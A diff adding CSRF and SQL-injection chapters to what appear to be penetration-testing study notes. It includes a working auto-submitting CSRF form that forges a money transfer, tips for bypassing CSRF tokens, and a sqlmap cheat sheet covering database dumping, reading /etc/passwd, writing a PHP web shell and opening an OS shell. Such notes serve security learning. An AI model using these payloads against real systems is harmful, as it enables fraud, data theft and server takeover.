@@ -131,5 +131,56 @@ Spoofed IP address
 
 ## Ch4 - CSRF
 
+JSON
 
+```
+<body onload=document.getElementById('xsrf').submit()>
+<form id="xsrf" action="transfer" method=post enctype="text/plain">
+<input name='{"username":"Attacker","amount":2500,"padding":"' value='garbage"}' type='hidden'>
+</form>
+```
+
+- Sometimes the CSRF tokens aren't validated, try sending a request without a token.
+- Sometimes the CSRF tokens are not mapped to the user, try using another user's token.
+- Sometimes the CSRF token's presence is required but the value can be left blank or random string of same length.
+- Sometimes the CSRF tokens do not have sufficient randomness, try guessing them.
+
+## Ch5 - SQLi
+
+[sqlmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
+- technique: BEUSTQ
+- dump:
+    - `--current-user`
+    - `--dbs`
+    - `-D db_name --tables`
+    - `-D db_name -T tbl_name --dump`
+    - `-D db_name -T tbl_name --columns`
+    - `-D db_name -T tbl_name --columns "col_name" --dump`
+- `--wizard`
+- `--dump-all`
+- URL rewriting: uses \* as an injection point.
+- Speeding up
+    - `--threads 3`
+    - `--null-connection`
+    - `--keep-alive`
+    - `--predict-output`
+- Reading files
+    - `--privileges`
+    - `--file-read=/etc/passwd`
+    - Ex. /var/www/config.inc , /var/www/html/config/config.inc.php
+- Writing files
+    - `--file-write=shell.php`
+    - `--file-dest=/var/www/shell-php` 
+    - PHP one-liner shell: `<?php system($_GET[1337]); ?>`
+- POST requests
+    - `-u URL --data="params" -p param_to_test`
+    - Save the request and `sqlmap.py -r request.txt -p param_to_test`
+- Cookies `--cookie="PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAA"`
+- HTTP auth: `--auth-cred and --auth-type`
+- Database shell: `--sql-shell`
+- Command shell: `--os-shell` or `--os-cmd "uname -a"`
+- Tamper: `--tamper charencode -v3`
+- Proxy: `--proxy="https://proxy.example.com:8080"`
+- Tor: `--tor`
 
